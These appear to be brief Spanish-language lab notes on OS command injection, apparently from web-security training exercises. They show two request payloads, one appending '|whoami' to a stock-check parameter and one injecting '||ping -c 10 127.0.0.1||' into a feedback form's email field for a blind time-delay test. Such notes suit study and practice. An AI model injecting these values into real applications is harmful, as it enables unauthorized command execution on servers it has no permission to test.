# OS command injection


# OS command injection, simple case

El caso mas simple en donde se consulta el stock se le agrega el | y el comando

```
productId=1&storeId=1|whoami

```

# Blind OS command injection with time delays

En este caso se inyectan comandos en Submmit feedback se usa de nueva cuenta el pipe |

```
csrf=fTYXLcrD0AxoStj3Bo0z58nhjs22Oep5&name=Masa&email=masa%40gmail.com||ping+-c+10+127.0.0.1||&subject=abcd1234&message=Comment
```





